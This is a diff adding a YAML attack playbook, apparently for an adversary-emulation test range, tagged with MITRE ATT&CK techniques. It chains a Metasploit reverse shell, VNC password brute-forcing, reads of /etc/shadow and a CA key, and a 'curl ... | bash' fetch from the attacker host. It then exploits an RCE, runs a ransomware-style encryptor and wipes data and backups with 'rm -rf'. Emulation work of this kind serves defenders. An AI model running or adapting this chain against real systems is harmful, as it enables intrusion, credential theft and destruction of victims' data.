@@ -1,0 +1,359 @@
+#### THIS EXPLOIT IS BROKEN DUE TO CHANGE IN VERSION ###
+
+####################
+#
+# Scenario 3 b b
+#
+####################
+
+vars:
+  $SERVER_ADDRESS: fw.attackbed.com
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $LISTA:
+  - "password1"
+  - "password2"
+  - "password3"
+  - "password4"
+  - "password5"
+  - "123"
+  - "12345"
+  - "12345678"
+ 
+commands:
+
+### PREPARE THE REVERSE SHELL FOR THE REPOSERVER
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  - type: msf-payload
+    cmd: cmd/unix/python/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    local_path: $RSHELL
+
+  - type: msf-module
+    creates_session: portforward
+    cmd: exploit/multi/handler
+    payload: "cmd/unix/python/meterpreter/reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    background: true
+    kill_on_exit: true
+
+  - type: webserv
+    local_path: $RSHELL
+    port: 8888
+    background: True
+    kill_on_exit: true
+
+
+### BRUTEFORCE VNC
+  - type: loop
+    break_if: $RESULT_STDOUT =~ vnc_connected
+    cmd: "items(LISTA)"
+    commands:
+    - type: vnc
+      creates_session: foothold
+      username: john
+      password: $LOOP_ITEM 
+      hostname: $SERVER_ADDRESS
+      port: "5901"
+      cmd: move
+      x: 5
+      y: 5
+    metadata:
+      techniques: "T1110.001,T1021.005"
+      tactics: "Credential Access, Lateral Movement"
+      technique_name: "Brute Force: Password Guessing,Remote Services: VNC"
+
+  - type: vnc
+    session: foothold
+    cmd: click
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "terminal"
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "sudo -i"
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 2
+
+#id 
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "id"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 2
+
+#cat etc/shadow 
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "cat /etc/shadow"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1003.008"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
+
+  - type: sleep
+    seconds: 2 
+
+#cat certificates
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1213"
+      tactics: "Collection"
+      technique_name: "Data from Information Repositories"
+
+  - type: sleep
+    seconds: 2 
+
+#cat healthcheck cron
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "cat /media/share/healthcheck_cron.sh"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1039"
+      tactics: "Collection"
+      technique_name: "Data from Network Shared Drive"
+
+  - type: sleep
+    seconds: 2 
+
+#  HERE THE REVERSE SHELL FOR PORTFORWARDING ON THE REPOSERVER IS ESTABLISHED
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: curl http:///$ATTACKER_ADDRESS:8888/install.sh | bash
+
+  - type: sleep
+    seconds: 2
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: sleep
+    seconds: 5
+
+  - type: vnc
+    cmd: close
+    session: foothold
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
+
+#### Here the lateral movement steps take place
+
+  - type: msf-session
+    session: portforward
+    cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
+
+  - type: msf-session
+    session: portforward
+    cmd: portfwd add -l 1881 -r 192.168.100.23 -p 1881
+    metadata:
+      techniques: "T1572"
+      tactics: "Command and Control"
+      technique_name: "Protocol Tunneling"
+
+
+## This is the healthcheck exploit that needs fixing -> offsets are different in new version
+
+  - type: msf-module
+    creates_session: movement
+    cmd: exploit/linux/misc/healthcheck_rce
+    payload: "cmd/linux/http/x64/meterpreter_reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    options:
+      RHOSTS: 127.0.0.1  
+    metadata:
+      techniques: "T1210"
+      tactics: "Lateral Movement"
+      technique_name: "Exploitation of Remote Services"
+
+
+#################### MOVED ############################################
+  - type: msf-session
+    session: movement
+    cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
+
+  - type: msf-session
+    session: movement
+    cmd: getuid
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
+
+  - type: msf-session
+    session: movement
+    cmd: shell
+
+  # Prepare for upgradeshell
+  - type: setvar
+    cmd: movement
+    variable: $UPGRADESESSION
+
+  - type: include
+    local_path: upgrade.yml
+
+  - type: msf-session
+    session: movement
+    cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
+    metadata:
+      techniques: "T1486,T1105"
+      tactics: "Impact,Command and Control"
+      technique_name: "Data Encrypted for Impact,Ingress Tool Transfer"
+
+  - type: msf-session
+    session: movement
+    cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
+    metadata:
+      techniques: "T1486,T1565.001"
+      tactics: "Impact"
+      technique_name: "Data Encrypted for Impact,Data Manipulation: Stored Data Manipulation"
+
+  - type: msf-session
+    session: movement
+    cmd: find /media/data/Images
+    metadata:
+      techniques: "T1018"
+      tactics: "Discovery"
+      technique_name: "Remote System Discovery"
+
+  - type: msf-session
+    session: movement
+    cmd: cat /etc/passwd
+    metadata:
+      techniques: "T1087.001"
+      tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
+  
+  - type: msf-session
+    session: movement
+    cmd: userdel -f john
+    metadata:
+      techniques: "T1531"
+      tactics: "Impact"
+      technique_name: "Account Access Removal"
+  
+  - type: msf-session
+    session: movement
+    cmd: rm -rf /media/data/*
+    metadata:
+      techniques: "T1485"
+      tactics: "Impact"
+      technique_name: "Data Destruction"
+  
+  - type: msf-session
+    session: movement
+    cmd: rm -rf /var/backups/*
+    metadata:
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
+
+  - type: msf-session
+    session: movement
+    cmd: systemctl stop exim4.service
+    metadata:
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
+
+  - type: sleep
+    seconds: 30
